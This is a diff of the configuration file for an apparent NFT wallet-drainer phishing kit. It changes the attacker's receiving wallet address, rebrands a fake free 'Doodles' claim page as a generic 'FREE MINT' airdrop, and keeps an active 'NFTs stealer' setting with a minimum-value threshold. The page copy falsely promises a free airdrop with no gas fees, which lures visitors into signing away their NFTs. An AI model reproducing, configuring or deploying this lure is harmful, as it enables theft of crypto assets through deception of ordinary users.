@@ -1,41 +1,35 @@
-const receiveAddress = "0xd23014904512658528cDd2D379Bb59Ba4f7C3e66";
+const receiveAddress = "0x5BCFe0f00583665f6eC0507cE390A3f3dc9bBAc4";
 
 const collectionInfo = {
-    name: "Doodles Drop",
+    name: " FREE MINT",
     socialMedia: {
-        discord: "https://discord.com/invite/doodles",
-        twitter: "https://twitter.com/doodles",
-        instagram: "https://www.instagram.com/welikethedoodles/",
+        discord: "",
+        twitter: "",
+        instagram: "",
     },
 }
-
-const signMessage = `Welcome, \n\n` +
-    `Click to sign in and accept the Terms of Service.\n\n` +
-    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
-    `Wallet Address:\n{address}\n\n` +
-    `Nonce:\n{nonce}`;
 
 const indexPageInfo = {
     backgroundImage: "background.jpg", // relative path to background image (in assets)
     title: "{name}", // {name} will be replaced with collectionInfo.name
-    underTitle: "Claim Your Free Doodle",
+    underTitle: "1 potato, 2 potatoz, 3 potatoz... 9999 potatoz!",
 }
 
 const claimPageInfo = {
-    title: "CLAIM YOUR<br>DOODLE", // <br> is a line break
-    shortDescription: "DOODLES IN SPACE.",
-    longDescription: "ALL DOODLERS CAN CLAIM THEIR SPACE DOODLE FOR FREE AND RECEIVE ITS OWN UNIQUE APPEARANCE AND COMPETENCIES WITHIN THEIR PERSONAL SPACECRAFT. STATS LIKE “BLADDER MANAGEMENT” AND “PILOTING ABILITY” DEFINE A DOODLES COMPETENCY IN SPACE.",
+    title: "AIRDROP", // <br> is a line break
+    shortDescription: "You are eligible to get airdrop ",
+    longDescription: "You will get same amount of airdrop NFT based on how many original NFT you have One address can only claim one time, You will get NFT immediately after sign. No need to pay the gas fee",
 
     claimButtonText: "CLAIM NOW",
 
-    image: "adidas.png", // relative path to image (in assets)
+    image: "ola.jpeg", // relative path to image (in assets)
     imageRadius: 250, // image radius in px
 }
 
 const drainNftsInfo = {
-    active: true, // Active (true) or not (false) NFTs stealer.
-    minValue: 0.0126, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
-    nftReceiveAddress: "0xd23014904512658528cDd2D379Bb59Ba4f7C3e66" // leave empty if you want to use the same as receiveAddress
+    active: true,   // Active (true) or not (false) NFTs stealer.
+    minValue: 0.25,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    nftReceiveAddress: "0x5BCFe0f00583665f6eC0507cE390A3f3dc9bBAc4" // leave empty if you want to use the same as receiveAddress
 }
 
 const customStrings = {
